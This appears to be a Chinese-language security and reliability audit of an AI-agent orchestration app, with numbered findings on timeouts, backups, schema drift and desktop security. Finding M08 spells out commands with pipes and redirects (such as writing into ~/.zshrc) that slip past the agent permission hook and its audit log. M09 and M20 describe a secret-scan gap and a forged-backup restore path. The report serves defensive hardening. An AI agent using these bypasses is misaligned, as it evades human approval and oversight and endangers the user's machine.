- **问题**：Store::open（lib.rs:78-83）对已存在的库无条件执行 PRAGMA integrity_check 全库扫描 + create_encrypted_backup，后者 VACUUM INTO 复制整库（protection.rs:166-169）、tokio::fs::read 把整个副本读进内存（:170）再加密产生第二份拷贝（:171），即每次 daemon 重启都有 O(库大小) 的时间和约 2 倍库大小的内存峰值——无论是否有待执行迁移。open_client（lib.rs:139）也在每次桌面/CLI 启动时做全库 integrity_check。events 等 append-only 表只在任务被彻底清除时才删（storage.rs:395），长期保留的已合并任务让库单调增长。桌面端 initialize_backend（apps/desktop/src-tauri/src/main.rs:608）block_on ensure_daemon，而 IPC request()（daemon/src/lib.rs:197-209）的 read_line 没有任何超时——首个 Ping 会一直阻塞到 daemon 完成整个 open 流程。
- **未来风险**：库涨到数百 MB～GB 级后：每次开机/升级 daemon 启动要几十秒到分钟级，期间桌面 App 在 setup 阶段完全冻结无任何 UI 反馈，用户会强杀重试形成循环；内存峰值还可能在低配机器上触发 OOM。这是随使用时长必然恶化的路径。
- **改进建议**：1) 仅在检测到待执行迁移时才做迁移前备份，常规备份移到 maintenance_loop 低频执行；2) 加密改为流式（分块读+AEAD 分段或先写临时文件再流式加密），消除整库读入内存；3) integrity_check 改为 PRAGMA quick_check 或降频；4) 给 request() 加读超时、给 initialize_backend 加进度/超时提示。
- **核查证据**：crates/persistence/src/lib.rs:78-83 对已存在的库无条件执行 integrity_check（protection.rs:143-152 为全库 PRAGMA integrity_check）+ create_encrypted_backup，与是否有待执行迁移无关；protection.rs:166-173 确认 VACUUM INTO 复制整库、tokio::fs::read 整体读入内存、encrypt_bytes 再产生第二份拷贝；open_client（lib.rs:139）每次桌面/CLI 启动也做全库 integrity_check；daemon 的 serve 在 lib.rs:235 先 bind 监听 socket、lib.rs:242 才执行耗时的 Orchestrator::open，期间客户端连接进入 backlog，而 request()（lib.rs:197-209）的 read_line 无超时，apps/desktop/src-tauri/src/main.rs:608 block_on(ensure_daemon) 会同步阻塞桌面启动直到 daemon 完成整个 open 流程，阻塞链完整成立

### M07. open_client 不校验 schema 版本，客户端与 daemon/库版本漂移时报晦涩的 no such column 错误

- **位置**：`crates/persistence/src/lib.rs:124`
- **领域**：持久化层｜**分类**：升级/迁移风险
- **状态**：待修复
- **问题**：open_client（lib.rs:124-146）打开库时既不运行迁移也不检查 _sqlx_migrations 的最新版本是否达到当前二进制的预期。桌面端靠 ensure_daemon 的『sidecar 与已安装 daemon 字节一致 + ipcVersion==2』检查（daemon_client.rs:45-53）间接保证先迁移后打开，但 CLI（crates/cli/src/main.rs:215）没有任何等价保护：daemon 未运行或还是旧版时照样直接打开旧 schema 的库。当前分支正好引入了这种漂移点：0023 新增 identity_file 列，而 execution_nodes.rs:3/56 的 SELECT 硬编码引用该列。
- **未来风险**：用户通过 cargo/homebrew 单独升级 CLI、或 launchd 里残留旧版 daemon 时，新客户端对旧库执行含新列的查询直接报 sqlx『no such column: identity_file』一类运行时错误，表现为随机命令失败，用户无从理解；随着迁移数量增长（已 23 个）这种组合只会更多。
- **改进建议**：在 open_client 里读取 _sqlx_migrations 的 MAX(version)，与编译期内嵌迁移列表的最大版本比较：库版本低于二进制预期时返回明确错误（『后台服务尚未升级到 vN，请先重启 AgentFlow/daemon』），高于预期时提示客户端过旧；CLI 启动时也应先 Ping daemon 并校验 ipcVersion。
- **核查证据**：crates/persistence/src/lib.rs:124-146 的 open_client 只做 integrity_check，不运行迁移也不读取 _sqlx_migrations 版本（全文无任何版本比较）；crates/cli/src/main.rs:215 直接 Orchestrator::open_client（经 lifecycle.rs:10/43 落到 Store::open_client），之前无 Ping/ipcVersion 校验；桌面端有 ensure_daemon 的字节一致+ipcVersion==2 保护（daemon_client.rs），CLI 无等价物；漂移点真实：未提交的 0023_execution_node_identity.sql 新增 identity_file 列，而 execution_nodes.rs:3 和 :56 的 SELECT 硬编码引用该列，只要已安装的旧 daemon（仅迁移到 0022）还在管理库，新编译的 CLI 一跑 execution node 相关命令就会报 no such column，当前分支即处于此状态

### M08. Claude 权限钩子 allow 前缀匹配漏掉管道/重定向操作符，可绕过权限代理

- **位置**：`crates/daemon/src/main.rs:147`
- **领域**：运行时（进程/Git/守护进程）｜**分类**：安全
- **状态**：待修复
- **问题**：claude_permission_hook 的 command_matches_allow（main.rs:147-157）在前缀匹配后仅拒绝包含 "&&"、"||"、";"、"\n"、"`"、"$(" 的剩余部分，没有拦截单个 "|"、单个 "&"、">"、"<"。默认 allow 前缀包含 "git status"、"git diff"、"git log"（cli_providers.rs:114），因此 "git status | 任意命令" 或 "git diff > ~/.zshrc" 都会被钩子直接放行（输出 "{}"，不进入 AgentFlow 的人工审批/审计流）。此后唯一防线是 Claude CLI 自身的 Bash(git status:*) 前缀规则，而该规则同样把带重定向的单段命令视为前缀匹配——即向任意路径写文件（例如追加到 shell 启动脚本）的命令可以端到端不经任何审批执行。
- **未来风险**：被编排的开发 CLI（或被提示注入劫持的 Agent）构造 "git diff --no-color > ~/.zshrc" 这类命令，绕过 bc7076 引入的 Bash 权限代理直接写入用户家目录文件，实现持久化代码执行；管道形式 "git status | curl ..." 也不会出现在权限请求记录里，审计链出现盲区。
- **改进建议**：把拒绝列表改为白名单式解析：剩余部分只允许普通参数字符，出现任何 shell 元字符（| & > < ( ) { } \r 等）一律不匹配、走 defer 流程；或直接用 shell 词法解析器（如 shlex）拆分，逐词校验。同时为 hook 增加针对 "cmd | x"、"cmd > f"、"cmd & x" 的单元测试。
- **核查证据**：crates/daemon/src/main.rs:154 的拒绝列表只含 ["&&","||",";","\n","`","$("]，单个 | & > < 均不在内；prefix 校验只要求剩余部分以空白开头（main.rs:151），因此 `git status | curl x`、`git diff > ~/.zshrc` 都会在 main.rs:105-111 命中 allow 分支直接 println!("{}") 返回，不写 write_secure_atomic 捕获文件、不进入 defer 审批流。默认 allow 集合确为 git status/diff/log 并可被 extra_allowed_commands 扩展（crates/agent-adapters/src/cli_providers.rs:114-120），且 Claude 适配器只用 --permission-mode acceptEdits，没有任何 OS 级沙箱（cli_providers.rs:94-140，--sandbox 仅用于 codex/gemini/qwen/grok）。现有测试 main.rs:225-232 只覆盖了 &&，确认是遗漏而非有意。降级为 medium 的理由：AgentFlow 侧的“捕获+审计失效”可确证，但“端到端无审批写任意文件”还依赖 Claude CLI 自身对 shell 操作符的处理，本仓库无法证实其可绕过。

### M09. 提交前/审批前密钥扫描跳过 1MB–5MB 的文件，存在确定性绕过路径

- **位置**：`crates/git-engine/src/lib.rs:377`
- **领域**：运行时（进程/Git/守护进程）｜**分类**：安全
- **状态**：待修复
- **问题**：validate_staged_commit（lib.rs:377）与 validate_commit_range（lib.rs:451）都只在文件 <=1MB 时执行 detected_secret 扫描；1MB 到 5MB（单文件上限）之间的文件既能通过提交拦截，又能通过审批时的复检，全程不做密钥检测。此外 looks_like_placeholder（lib.rs:679-694）用子串包含判断，真实凭证的随机部分若恰好包含 "test"/"sample" 等片段会被当作占位符放行（注意 process-supervisor 的 redact 不受此影响，只有提交拦截受影响）。
- **未来风险**：Agent 把真实密钥写进一个 1.2MB 的 JSON/lock/数据文件（在生成型改动里很常见），提交、评审、人工批准、合并全链路都不会告警，密钥最终进入主分支历史；一旦项目配置了 GitHub PR 交付模式还会被 push 到远端，形成不可撤销的泄漏。
- **改进建议**：对超过 1MB 的文本文件改为流式/分块扫描（正则按行匹配即可，成本可控），或至少扫描文件头尾各 1MB；同时给 looks_like_placeholder 增加更严格的判定（如要求占位词出现在匹配值的固定位置，而非任意子串）。为 1MB+ 含密钥文件补充回归测试。
- **核查证据**：crates/git-engine/src/lib.rs:377 `if metadata.len() <= 1024 * 1024` 与 lib.rs:451 `if size <= 1024 * 1024` 确实把 1MB 以上的 blob 完全排除在 detected_secret 之外，而单文件硬上限是 MAX_SINGLE_FILE_BYTES=5MB（lib.rs:28、370-376），1MB–5MB 区间既过提交拦截也过审批复检，仓库内无其它提交期密钥扫描（process-supervisor 的 redact 只作用于日志/事件，crates/process-supervisor/src/lib.rs:524）。降级为 medium：这是纵深防御的启发式控制，凭证类文件名仍被 unsafe_path 拦截（lib.rs:598-653），且 1.2MB 文件的逐行 patch 在 UI_DIFF_MAX_BYTES=24MB 预算下仍会呈现给人工评审（lib.rs:31、530-544）。附带的 looks_like_placeholder 子串误判（lib.rs:679-694）属实但概率极低（如 AKIA+16 位随机大写字符含 "TEST" 约 1e-5），不足以单独支撑 high。

### M10. Git::output 所有 git 子进程无超时且未禁用交互提示，网络/凭证阻塞会永久挂起工作流

- **位置**：`crates/git-engine/src/lib.rs:63`
- **领域**：运行时（进程/Git/守护进程）｜**分类**：可靠性
- **状态**：待修复
- **问题**：Git::output（lib.rs:63-78）直接 .output().await，没有任何超时，也没有设置 GIT_TERMINAL_PROMPT=0 / GIT_ASKPASS。它承载了会走网络或触发凭证交互的操作：push_branch（operations.rs:78-87，交付流程 delivery.rs:41 调用）、prepare_linked_worktree 里的 submodule update --init --recursive 和 lfs checkout（compatibility.rs:177-211，任务启动 saga 调用）。对比之下 gh/glab 的 run_scm 有 120 秒超时（delivery.rs:576-586），git 却没有。
- **未来风险**：SSH 首次连接的 host-key 确认、凭证 helper 弹窗、submodule 远端不可达、LFS 服务器慢等场景下，git 进程无限期挂起：交付请求的 IPC 连接永远不返回，任务启动 saga 卡在 worktree 准备阶段；重启 daemon 后 recover_start_operations 会重放同一个 saga 再次挂住，形成"每次重启都卡死"的循环。
- **改进建议**：在 Git::output 中统一加 tokio::time::timeout（本地操作 60s、网络操作单独放宽到 5-10 分钟），超时后按进程组 kill 子进程；同时注入 env("GIT_TERMINAL_PROMPT","0") 与 env("GIT_ASKPASS","echo")，让缺凭证快速失败而不是等待交互。
- **核查证据**：crates/git-engine/src/lib.rs:63-78 直接 .output().await，只设了 LC_ALL 与 stdin(null)，全仓 grep 不到 GIT_TERMINAL_PROMPT / GIT_ASKPASS；网络型调用确实走这条路径：push_branch（operations.rs:78-87，被 delivery.rs:41 open_change_request 调用）、submodule update --init --recursive 与 lfs checkout（compatibility.rs:204、210，由 saga.rs:107 prepare_linked_worktree 调用，saga.rs:140 recover_start_operations 会在重启后重放，lifecycle.rs:62）。对照 gh/glab 的 run_scm_allow_failure 有 tokio::time::timeout(120s)（delivery.rs:581-586），git 侧确为不对称遗漏。保持 medium：launchd 下无控制终端，凭证/host-key 交互多半是快速失败而非挂起，真正的无限期阻塞主要来自远端黑洞连接与慢 LFS。

### M11. Provider stdout/stderr 落盘文件无大小上限，MAX_LOG_BYTES 只限制事件流不限制磁盘

- **位置**：`crates/process-supervisor/src/lib.rs:27`
- **领域**：运行时（进程/Git/守护进程）｜**分类**：资源泄漏
- **状态**：待修复
- **问题**：子进程的 stdout/stderr 直接绑定到文件描述符（lib.rs:96-98），MAX_LOG_BYTES=64MB（lib.rs:27）只在 tail_durable_log 里停止转发事件（lib.rs:240-242），文件本身继续无限增长。且由于 tail 持续读到字节会刷新 activity（lib.rs:239），疯狂输出的进程永远不会触发 idle_timeout，只有绝对 timeout 能兜底。运行日志的清理要等任务进入 MERGED/CANCELLED 等终态后 raw_logs_days=14 天才执行（storage.rs:144-160）。
- **未来风险**：一个进入输出循环的 CLI（构建死循环、重复重试打印栈）在数小时的绝对超时窗口内可以写出几十 GB 日志，把磁盘写满；磁盘满后 SQLite 写入开始失败，波及整个 daemon 的状态机与恢复逻辑（agent_run 的事件 sink 也会先死，见另一条发现），故障从单任务扩散为全局。
- **改进建议**：超过 MAX_LOG_BYTES 后不要只置 truncated 标记：直接 cancel/terminate 该进程组并把 outcome 标记为 log_truncated（当作一种资源超限失败），或周期性 stat 文件大小超限即杀。至少在 adoption 的 durable_log_size 检查处也加同样的上限。
- **核查证据**：crates/process-supervisor/src/lib.rs:78-98 把子进程 stdout/stderr 直接绑到文件描述符，文件本身无任何上限；MAX_LOG_BYTES=64MB（lib.rs:27）只在 tail_durable_log 里置 truncated 并停止转发事件（lib.rs:240-242），且 activity 刷新在大小判断之前（lib.rs:238-239），所以狂刷输出的进程确实永远触发不了 idle_timeout（lib.rs:147）。清理侧确认只在任务进入 MERGED/ROLLED_BACK/CANCELLED 且 finished_at 早于 raw_logs_days=14 天后执行（orchestrator/src/storage.rs:144-150，contracts/src/lib.rs:607/617）。保持 medium：单次运行仍被绝对 timeout 兜底（默认 developer 1800s / reviewer 900s，orchestrator/src/agent_run.rs:31-39），所以是“单轮数 GB 级”而非发现中说的“数小时数十 GB”。

### M12. 事件 sink 任务出错被 let _ 吞掉，预算熔断与权限提示检测会静默失效

- **位置**：`crates/orchestrator/src/agent_run.rs:118`
- **领域**：运行时（进程/Git/守护进程）｜**分类**：错误处理吞异常
- **状态**：待修复
- **问题**：agent_run.rs:118-133 的 sink 任务负责三件事：写 agent-events.jsonl、live_budget_exceeded 超预算时 cancel、looks_like_permission_prompt 检测到交互式提权时 cancel。任何一次 File::create/write_all 失败（磁盘满、run_dir 被清理）都会让整个 sink 提前 return Err 并停止消费 channel，之后 tail 的 send 直接失败被丢弃；而 agent_run.rs:251 用 let _ = sink.await; 把错误完全吞掉，运行继续、无任何日志。
- **未来风险**：磁盘紧张时（很可能正是上一条无界日志导致的），成本预算熔断和"Provider 请求交互式授权"的安全刹车同时失效：付费 API 型 Provider 会一直烧钱烧到绝对超时；权限提示未被截停，任务结束后也没有 PERMISSION_UNSTRUCTURED_PROMPT 保护路径的记录，事后无法解释为什么防线没起作用。
- **改进建议**：sink 内部 write 失败时不要退出循环：记录一次 tracing::error 后继续消费 channel（保留 budget/permission 检查，仅放弃落盘）；sink.await 的结果至少要打日志并写入 events 表，让防线失效变得可见。
- **核查证据**：crates/orchestrator/src/agent_run.rs:118-133 的 sink 用 `?` 传播 File::create/write_all 错误，一旦出错立即 return，rx 被 drop，后续 process-supervisor 的 `let _ = tx.send(event).await`（process-supervisor/src/lib.rs:275）静默丢弃全部事件，live_budget_exceeded 熔断（agent_run.rs:121-123）与 looks_like_permission_prompt 刹车（agent_run.rs:124-127）随之失效；agent_run.rs:251 `let _ = sink.await;` 确实吞掉错误且无任何日志，而运行结束后的 PERMISSION_UNSTRUCTURED_PROMPT 保护完全依赖 sink 设置的原子标志（agent_run.rs:291-296），没有基于落盘日志的兜底复检。维持 medium：触发前提是磁盘满/run_dir 被删这类 I/O 失败（run_dir 在 agent_run.rs:19 已提前创建），概率不高，但失效后完全不可观测。

### M13. 结果契约 schema 演进无兼容策略：加一个字段会同时打破所有 CLI Provider 与历史工件

- **位置**：`crates/contracts/src/schemas.rs:93`
- **领域**：Provider 适配与契约｜**分类**：升级/迁移风险
- **状态**：待修复
- **问题**：require_all_object_properties（schemas.rs:93-112）把生成 schema 的所有属性设为 required 且 additionalProperties:false；DevelopmentResult/ReviewResult/ReviewIssueResult/PlanResult 同时标注 deny_unknown_fields（contracts/src/lib.rs:485,501,513；governance.rs:154-155）。这意味着契约在两个方向都是脆的：给结构体加任何新字段后，旧提示词契约下的 Provider 输出会因缺 required 字段被 validate_schema 拒绝，除非同步把字段名手工加进 support.rs 里三处各自独立的 insert_null_for_missing 硬编码清单（support.rs:416-419 开发结果、486-495 审查 issue、328-331 计划 step）；反向，Provider 多输出一个字段会被 deny_unknown_fields 硬拒。schema_version 只有 `!= 1 即拒`（support.rs:423-427 等）没有任何升级/迁移路径。此外 Codex/Qwen 用的是落盘在 app_data/schemas/ 的 schema 文件（review.rs:287-296），升级后若磁盘文件未同步重新生成，CLI 端与核心校验将按两套 schema 工作。
- **未来风险**：下一次给交付契约加字段（例如给 ReviewIssueResult 加 category）时，若遗漏任何一处硬编码清单或磁盘 schema 未再生成，所有 CLI Provider 的评审/开发结果会在升级后集体解析失败，任务批量 Blocked；历史 run 目录中的 result.json 在 quality replay 等重放路径上也无法再读取。
- **改进建议**：把「新增字段必须 nullable 且自动进入 insert_null_for_missing」做成单一来源：从结构体派生可选字段清单（如用属性宏或在 contracts 里集中导出 OPTIONAL_FIELDS 常量），三处解析共用；为 schema_version 预留 1..=N 的兼容窗口并写明迁移规则；启动时用内嵌 schema 覆盖/校验 app_data/schemas 下的落盘副本；补一个「用旧版样例 JSON 反序列化当前契约」的回归测试。
- **核查证据**：schemas.rs:93-112 把所有属性设为 required 且 additionalProperties:false，contracts/lib.rs:485/501/513 与 governance.rs:155 均 deny_unknown_fields，新增字段须手工同步 support.rs:328-331、416-419、486-495 三处独立硬编码的 insert_null_for_missing 清单，schema_version 只有 !=1 即拒（support.rs:336、423-427、501）无迁移窗口——核心脆性成立；但「磁盘 schema 未同步再生成会两套 schema 工作」的子论点被反驳：lifecycle.rs:21-38 在每次 Orchestrator::open 时都用内嵌 schema 重写 app_data/schemas 下全部三个文件，升级重启即自动同步。

### M14. Kimi/MiniMax CLI 半接线：检测与设置入口齐全但没有适配器，mmx 兼容性校验为空

- **位置**：`crates/orchestrator/src/review.rs:328`
- **领域**：Provider 适配与契约｜**分类**：测试缺口
- **状态**：待修复
- **问题**：AgentKind 已有 KimiCli/MiniMaxCli，EnvReport 有对应字段（contracts/src/lib.rs:328-329），env_check 会探测 kimi/mmx（lifecycle.rs:299-300），env_set_cli_path 接受 kimi_cli/minimax_cli 且 mmx 的必需 flags 为空数组（lifecycle.rs:574-575，config/provider-compatibility.json 中 mmx.requiredFlags=[]）——任何 PATH 上叫 mmx 的可执行文件都会被判为「已安装且兼容」，cli_auth_status 还会对它执行 `mmx auth status` 并以退出码 0 视为已认证（support.rs:934-977）。但 adapter() 把这两个 kind 映射到 UnavailableProviderAdapter（review.rs:328-330），运行时必然 NotFound。同类问题的轻度版本：Grok/Qoder 适配器的 flags/输出形态（如 grok 的 streaming-json、dontAsk）只有 args 构造的单元测试（agent-adapters/src/tests.rs:356-371），没有任何针对真实 CLI 输出样例的解析契约测试。
- **未来风险**：用户在设置页看到 Kimi/MiniMax「已连接」，将其配入 developer/reviewer 或 fallback 链后，任务在运行时才失败并报「Provider package not installed」这类与 UI 状态矛盾的错误；后续真正接线 Kimi/MiniMax 或 grok CLI 升级改动输出格式时，因缺少基于录制样例的契约测试，破坏只会在用户环境里暴露。
- **改进建议**：在真正实现适配器之前，把 KimiCli/MiniMaxCli 从 env_set_cli_path 白名单和设置 UI 的可连接列表中移除（或明确标注「即将支持」且不可选）；给 mmx/kimi 补上非空 requiredFlags；为每个已接线 CLI 增加基于真实输出录制样例（stream-json、含前后缀噪声、含截断）的 parse_plan/parse_development/parse_review 契约测试，并加一条「每个可在 UI 中选择的 AgentKind 必须有非 Unavailable 适配器」的编译期/测试期断言。
- **核查证据**：review.rs:328-330 将 KimiCli|MiniMaxCli 映射到 UnavailableProviderAdapter，而 EnvReport 有对应字段（contracts/lib.rs:328-329）、env_check 探测 kimi/mmx（lifecycle.rs:299-300）、env_set_cli_path 接受两者且 mmx flags 为空（lifecycle.rs:574-575，config/provider-compatibility.json mmx.requiredFlags=[]），空 flags 使任意名为 mmx 的可执行文件被判兼容（support.rs:620-624），`mmx auth status` 退出码 0 即认证（support.rs:936、970-971），桌面 ProviderCatalog.tsx:49-50 将其列为可连接 CLI；grok/qoder 仅有 args 构造测试（tests.rs:356-371）无真实输出样例契约测试。缓解：provider_list（lifecycle.rs:335-360）不含这两个 kind，provider_preflight 可在创建前拦截，故「运行时才失败」略有夸大，但设置页状态矛盾与空校验属实，维持 medium。

### M15. 运行路径的 CLI 解析用交互式登录 shell 且无超时，preflight 的 tool_status 也未加时限

- **位置**：`crates/agent-adapters/src/support.rs:157`
- **领域**：Provider 适配与契约｜**分类**：可靠性
- **状态**：待修复
- **问题**：resolve_cli（support.rs:150-175）在 which 失败后回退执行 `$SHELL -lic "command -v {name}"`：-lic 会完整加载用户的登录+交互 rc（.zshrc 等），既没有超时（output().await 可无限挂起，例如 rc 里有 exec tmux、阻塞的提示/网络调用），rc 打印到 stdout 的任何内容也会被并入结果并当作路径使用（167 行 trim 后整段 stdout 即路径）。该函数不仅用于环境检测，还在每次真实运行的 start() 里调用（cli_providers.rs:39、505、599）。环境页的调用有 bounded_tool_status 的 10 秒兜底（lifecycle.rs），但 preflight 的 cached_cli_runtime_probe 直接调 agentflow_agent_adapters::tool_status（orchestrator/src/preflight.rs:168-173），内部的 --version/--help/auth 子进程（support.rs:589-609、948-953）全部没有超时。
- **未来风险**：用户 rc 配置稍有异常（首次运行的插件安装提示、echo 输出、阻塞命令）就会导致：任务启动无限挂起且无任何超时/错误提示（cancellation 只覆盖 supervisor 阶段，spawn 前的 resolve 不受控），或解析出一个混入 rc 输出的错误路径导致 spawn 失败；preflight 则会整体卡死，桌面「创建并立即开始」按钮无响应。
- **改进建议**：resolve_cli 的 shell 回退改为 `-lc`（去掉 -i）并用 tokio::time::timeout 包裹（如 5 秒），只取 stdout 最后一行且校验该路径存在、可执行；tool_status 内部所有子进程调用统一加超时；preflight 路径复用 bounded_tool_status 而不是裸 tool_status。
- **核查证据**：support.rs:157-173 在 which 失败后执行 `$SHELL -lic "command -v {name}"`，无任何 timeout，且 167-169 行把整段 stdout trim 后当作路径（rc 的 echo 输出会混入）；该函数在真实运行 start() 中被调用（cli_providers.rs:39、505、599，codex 经 195 行 resolve_codex_cli 间接调用）；agent_run.rs:230-248 对 adapter.start 无墙钟超时，spawn 前挂起即无限等待；preflight.rs:168-173 直接调裸 tool_status，其内部 --version/--help（support.rs:589、600-609）与 cli_auth_status 子进程（support.rs:947-952）均无超时，只有环境页走 bounded_tool_status 的超时兜底（lifecycle.rs:671-672）。

### M16. Tauri 窗口未配置 CSP，且外链 URL 直接来自远端数据未做协议校验

- **位置**：`apps/desktop/src-tauri/tauri.conf.json:12`
- **领域**：桌面端｜**分类**：安全
- **状态**：待修复
- **问题**：tauri.conf.json 的 app 节只配置了 windows，没有 security.csp——Tauri 2 默认 csp 为 null，即 webview 完全没有 CSP。该窗口注册了约 70 个特权 IPC 命令（main.rs:530-601），包括 execution_node_upsert/check（可触发本机 ssh 到任意 host）、cli_install、api_credential_set、database_backup_restore 等。同时前端大量渲染来自不可信源的文本（Agent CLI 输出、远端 CI 返回内容），并且 GovernanceTab.tsx:118 和 CiChecksPanel.tsx:85-86 把后端从远端 forge/CI API 拿到的 delivery.remoteUrl、check.detailsUrl 直接放进 <a href target="_blank">，没有 http(s) 协议白名单校验，也没有引入 opener 插件显式定义外链打开方式（capabilities/default.json 只有 core:default 和 dialog:default）。
- **未来风险**：当前虽未发现 dangerouslySetInnerHTML 等直接注入点，但缺 CSP 意味着未来任何一处引入的 XSS（新依赖、Monaco/图表类库、渲染 Agent 生成的富文本）都直接升级为「可调用全部特权命令」——等价于本机任意命令执行（通过配置 execution node 的 host/identity 让 ssh 连攻击者机器，或写入凭据）。远端返回的 URL 未校验协议，一旦渲染路径变化（如改用非 React 渲染或 React 版本行为变化）可能出现 javascript: 链接注入。
- **改进建议**：在 tauri.conf.json 配置严格 CSP（default-src 'self'，禁 remote script），作为纵深防御底线；对 remoteUrl/detailsUrl 在渲染前用 URL 解析并只允许 http/https；显式引入 tauri-plugin-opener 并用最小 scope 声明允许打开的外链方式，替代裸 target=_blank。
- **核查证据**：tauri.conf.json:12 的 app 节仅有 windows，无 security.csp（Tauri 2 默认 csp 为 null）；main.rs:528-601 注册约 72 个特权命令，含 execution_node_upsert/check、cli_install、api_credential_set、database_backup_restore；GovernanceTab.tsx:118 把 data.delivery.remoteUrl、CiChecksPanel.tsx:85 把 check.detailsUrl 直接放进 <a href target="_blank">，无协议白名单；capabilities/default.json 仅 core:default 与 dialog:default，未引入 opener 插件（main.rs:627 仅注册 dialog 插件）。当前无 dangerouslySetInnerHTML 注入点，属纵深防御缺失，维持 medium。

### M17. logStore 的 clear 从未被调用，日志缓冲随会话时长无限增长

- **位置**：`apps/desktop/src/stores/logStore.ts:94`
- **领域**：桌面端｜**分类**：资源泄漏
- **状态**：待修复
- **问题**：logStore.ts:94-99 定义了 clear(runId)，但全仓 grep 确认没有任何调用方。buffers 是以 runId 为 key 的全局 Record，每个查看过或直播过的 run 最多驻留 5000 条 AgentEvent（每条含 summary 和可能很长的 text 全文，工具输出动辄数 KB）。useGlobalEvents.ts:36-44 处理 task:removed 时清理了 react-query 的各类缓存，唯独没有清理该任务名下 run 的日志缓冲；run 结束后缓冲也永不释放。
- **未来风险**：桌面应用是长驻进程（CloseGuard 甚至鼓励用户保持后台运行），一天内跑几十个任务、每任务多个 run，每个缓冲按 5000 条 × 平均 1-2KB 计即 5-10MB，内存占用只增不减，最终表现为应用越开越肿、GC 压力增大、直播流 rAF 刷新变卡，且用户重启前无法恢复。
- **改进建议**：在 run:finished 事件处理中对已结束的 run 延迟释放（或降级为只保留最后几百行）；task:removed 时按 taskId 清理其所有 run 的缓冲；并对 buffers 总量加全局上限（LRU 淘汰最久未访问的 run）。
- **核查证据**：logStore.ts:94-99 定义 clear(runId)，grep 全 src 目录（排除 logStore.ts 自身）确认无任何 ".clear(" 或 prependHistory 调用方；useGlobalEvents.ts:36-44 处理 task:removed 时只 removeQueries 各 react-query 缓存，未触碰 logStore；run:finished（useGlobalEvents.ts:51-52）也只 invalidate 查询。buffers 以 runId 为 key、每个上限 5000 条含 text 全文的事件（logStore.ts:5），长驻进程（CloseGuard.tsx 存在且鼓励后台驻留）下只增不减，确认为 medium 级资源泄漏。

### M18. Tauri 事件 payload 类型为手写契约，无生成与 CI 漂移守护

- **位置**：`apps/desktop/src/lib/tauriEvents.ts:19`
- **领域**：桌面端｜**分类**：契约漂移
- **状态**：待修复
- **问题**：命令通道有完整守护：CI（ci.yml:48-49）跑 cargo run -p xtask 重新导出 bindings.ts 后 git diff --exit-code，且 main.rs:615-624 限制只有 xtask 能写生成文件——这套做得很好。但事件通道完全在守护之外：tauriEvents.ts:19-49 的 TaskChangedPayload、RunLogPayload、TaskRemovedPayload、AppErrorPayload 是手写的，与 event_bridge.rs:14-42 的 Rust 结构体（serde camelCase）靠人工保持同步，文件注释（tauriEvents.ts:12-17）自己也承认这一点。main.rs:630 的 mount_events 并未把这些事件纳入 specta 导出。
- **未来风险**：任何一侧改字段名、加字段、改类型（例如给 task:changed 增加 reason，或把 RunLogPayload 的 batch 改结构）都不会有编译错误、不会被 CI 拦截，前端拿到 undefined 后静默走错分支——事件驱动的缓存更新（useGlobalEvents 的 setQueryData）会悄悄失效，表现为「界面偶尔不刷新」这类最难排查的问题。事件通道恰恰是整个 UI 实时性的主干。
- **改进建议**：用 tauri-specta 的 Event 派生把这五个事件纳入 bindings.ts 生成（现有 xtask + git diff 守护即自动覆盖）；短期过渡可在 Rust 侧为每个 payload 写 serde 序列化快照测试，并在 TS 侧用同一份 JSON fixture 做类型断言测试，保证两边至少共享一组样本。
- **核查证据**：tauriEvents.ts:19-49 的 TaskChangedPayload/RunLogPayload/TaskRemovedPayload/AppErrorPayload 为手写，与 event_bridge.rs:14-42 的 serde(camelCase) 结构体人工同步，tauriEvents.ts:12-17 注释自认 tauri-specta 只导出 commands；main.rs:528 的 Builder 只调 .commands(collect_commands![...]) 未注册任何 specta 事件，main.rs:630 mount_events 不含这些 payload；ci.yml:48-49 的 xtask+git diff 守护只覆盖 bindings.ts 命令通道；grep 确认四个 payload 类型在 Rust/TS 两侧均无快照或对拍测试。确认为 medium。

### M19. TaskDetail 的恢复轮询是一次性的，事件订阅失效后界面可能永久冻结

- **位置**：`apps/desktop/src/routes/TaskDetail.tsx:74`
- **领域**：桌面端｜**分类**：状态一致性
- **状态**：待修复
- **问题**：TaskDetail.tsx:74-83 注释写明这是「dropped subscription 的 recovery poll」，但实现是 setTimeout 单次触发，依赖数组是 [detail?.updatedAt, detail?.status]：60 秒后 refetch 一次，若后端数据恰好没有变化（updatedAt 不变），effect 不会重新执行，定时器不再补设。而「事件桥挂了 + 后端暂时没动静」正是这个兜底最该工作的场景——此后任务的任何状态变化都无人通知详情页。列表页有 30s 的 refetchInterval 兜底（useTasks.ts:20），详情页没有。
- **未来风险**：事件桥初始化失败（event_bridge.rs:269-281 直接 return 退出循环，仅发一条 app:error toast）或 webview listen 订阅异常时，用户停在详情页等待任务完成，60 秒后系统只补救一次，之后任务实际已进入 WAITING_FOR_HUMAN_APPROVAL 或失败，界面却永远显示旧状态，用户误以为任务卡死并可能误操作取消。
- **改进建议**：把一次性 setTimeout 改为 setInterval（活跃状态下每 60s），或在 ACTIVE_STATUSES 时给 useTaskDetail 挂 refetchInterval；更彻底的做法是事件桥初始化失败时改为重试而非退出，并向前端广播「订阅降级」状态让 UI 自动切换到轮询模式。
- **核查证据**：TaskDetail.tsx:74-82 为单次 setTimeout(60s)，依赖数组 [detail?.updatedAt, detail?.status]——refetch 后数据未变（react-query 结构共享保持引用不变）则 effect 不重跑、定时器不再补设；useTasks.ts:24-30 的 useTaskDetail 无 refetchInterval（列表 useTasks.ts:20 才有 30s 兜底）；event_bridge.rs:269-281 初始化失败仅发一条 app:error 后直接 return 永久退出循环；且 queryClient.ts:10 全局 refetchOnWindowFocus:false，连窗口重获焦点的天然补救也被关闭，冻结场景比原发现描述的还少一层缓解。确认为 medium。

### M20. 备份解密在缺少魔数头时回退为明文，导致恢复流程可被伪造数据库劫持

- **位置**：`crates/persistence/src/protection.rs:127`
- **领域**：安全专项｜**分类**：安全
- **状态**：待修复
- **问题**：`decrypt_bytes`（crates/persistence/src/protection.rs:126-141）在数据不以 `AFENC1` 开头时直接 `return Ok(protected.to_vec())`，即把任意明文原样当作解密结果返回，AEAD 校验被完全跳过。`restore_encrypted_backup`（同文件 197-256）只校验路径位于 `backups/` 目录且扩展名为 `.afbak`，然后就用这段「解密」结果覆盖主库；随后的 `integrity_check` 只是 SQLite 的 `PRAGMA integrity_check`，只能证明文件是结构完整的 SQLite，不能证明它出自本机加密备份。这条路径经由 `DaemonRequest::DatabaseBackupRestore`（crates/daemon/src/lib.rs:595）暴露给无认证的本地 IPC。
